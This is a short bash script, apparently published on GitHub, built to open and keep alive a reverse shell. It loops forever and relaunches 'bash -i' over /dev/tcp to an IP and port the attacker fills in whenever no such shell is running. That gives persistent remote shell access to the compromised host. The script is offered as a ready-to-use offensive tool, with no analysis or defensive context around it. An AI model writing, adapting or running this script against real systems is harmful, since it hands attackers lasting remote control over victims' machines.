#!/bin/bash
#A small program designed to establish and keep a reverse shell open
#written by https://github.com/PwnKitteh

IP=""  		#Insert your IP here
PORT="8080"		#Insert the Port you're listening on here. 

while(true); do
	if [ $(ps -ef | grep "bash -i" | grep -v grep | wc -l) -eq 0 ]
	then
		echo "Process not found, Launching reverse shell to $IP on port $PORT"
		bash -i >& /dev/tcp/$IP/$PORT 0>&1
	else
		echo "Process found, sleeping for 20 seconds..."
		ps -ef | grep "bash -i" | grep -v "grep" | wc -l
	fi
	sleep 20
done
